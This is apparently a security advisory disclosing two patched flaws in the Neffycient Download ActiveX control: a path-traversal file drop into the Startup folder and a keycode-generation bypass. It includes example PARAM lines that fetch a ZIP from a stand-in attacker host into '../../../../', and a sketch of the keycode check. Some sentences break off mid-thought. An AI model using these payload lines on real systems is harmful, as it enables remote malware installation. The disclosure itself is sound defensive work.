Description:
Neffycient Download is a ActiveX control used to download and to upgrade
such as game install files through HTTP, FTP, etc. It has two
vulnerabilities.
1st, a attacker can copy a malicious file to any path such as start program
folder(C:\Documents and Settings\All Users\Start Menu\Programs\Startup).
2nd, a attacker can issue keycodes which are used to restrict execution on
other domains.

Object:
I notify this vulnerability not to promote abnormal uses but to make
a software more secure. This vulnerability was patched by the vendor&#039;s
positive effort. I hope this information helps many people who try
to study security and to develop an application.

1. Remote Code Execution
First of all, we must have write permission on a board in a web site used
this ActiveX or obtain a valid keycode which is correct to your site.
An Attacker who has a valid keycode can make a expolit by modifying
HttpSkin,
SkinPath&#039;s values. Malicious files which is on attacker&#039;s site must
For instance. The below modification copies abnormal files to Windows&#039;s
root directory.
<PARAM NAME="HttpSkin" VALUE="http://www.attacker.com/maliciousFiles.zip">
<PARAM NAME="SkinPath" VALUE="../../../../">

In this way an attacker can modify SkinPath&#039;s value to All Users&#039;s Start
Program Folder. Then he can execute his malicious program when the user
restarts his computer.

2. Generating a KeyCode Value
An attacker can make the keycode generator by debugging this ActiveX
the domain&#039;s length(hexadecimal).
Next five(or more) digits are valuable numbers to calculate a domain.
The keycode check the procedure of this ActiveX control likes below.
It calculates the keycode&#039;s value and returns four bytes as a result.
Next it starts the domain&#039;s calculation and returns four bytes.
Finally, it compares with these four bytes to check whether the site is
valid.
I made a PoC using inline assembly and C. But it doesn&#039;t open to the public
because of the vendor&#039;s request. (Just refer above descriptions.)
